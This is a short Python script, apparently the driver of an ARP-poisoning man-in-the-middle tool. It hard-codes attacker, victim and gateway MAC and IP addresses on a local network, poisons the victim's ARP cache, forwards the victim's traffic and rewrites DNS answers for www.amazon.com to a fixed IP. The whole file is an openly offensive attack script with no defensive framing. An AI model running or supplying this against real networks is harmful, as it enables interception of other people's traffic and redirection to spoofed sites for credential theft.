from tunneler.tunneler import *
from arp_poison.mitm import MITMService
import disruption_rules




def main():
    my_mac = b'\x08\x2e\x5f\x73\xdd\xef'
    target_mac = b'\x00\x1e\x64\x76\xbc\xd4'
    gateway_mac = b'\x30\x24\x78\xc0\x52\x84'

    target = '192.168.1.127'
    gateway = '192.168.1.1'

    disrupt_dns_rule = disruption_rules.generate_dns_reassign_rule('www.amazon.com', '104.16.41.71')

    mitm = MITMService(target_ip=target, gateway_ip=gateway, interval=0.5)
    tunnel = L2Tunnel(target_mac=target_mac, gateway_mac=gateway_mac, my_mac=my_mac, target_ip=target, interface='eno1')

    tunnel.add_disruption_rule(4, disrupt_dns_rule)

    tunnel.start_forward_thread()
    mitm.start_mitm()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        tunnel.stop_forward_thread()
        mitm.stop_mitm()




if __name__ == '__main__':
    main()